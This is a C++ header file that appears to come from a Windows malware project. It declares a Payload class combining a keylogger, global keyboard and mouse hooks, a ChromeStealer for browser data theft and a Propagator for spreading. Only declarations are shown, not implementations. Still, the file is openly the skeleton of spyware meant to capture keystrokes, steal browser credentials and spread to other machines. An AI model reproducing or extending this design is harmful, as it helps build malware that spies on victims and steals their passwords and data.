#pragma once

#include <string>

#include "Propagator.h"
#include "Keylogger.h"
#include "IPayload.h"
#include "ChromeStealer.h"
#include "MouseEvent.h"

#include <Windows.h>

class Payload : public IPayload
{
public:
	static Payload *current;
	static HINSTANCE Instance;
	static HHOOK KeyboardHook;
	static HHOOK MouseHook;
	static ChromeStealer Stealer;
public:
	Payload(void);
	virtual ~Payload(void);

	virtual void init(void);

	virtual void createKeyboardHook(void);
	virtual void deleteKeyboardHook(void);
	virtual void setApplicationPath(std::string const& appliPath);
	virtual void setDistributor(std::shared_ptr<IDistributor> ptr);

	Propagator &propagator(void);
	Keylogger &keylogger(void);
private:
	Propagator _ppgt;
	Keylogger _keylogger;
};

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);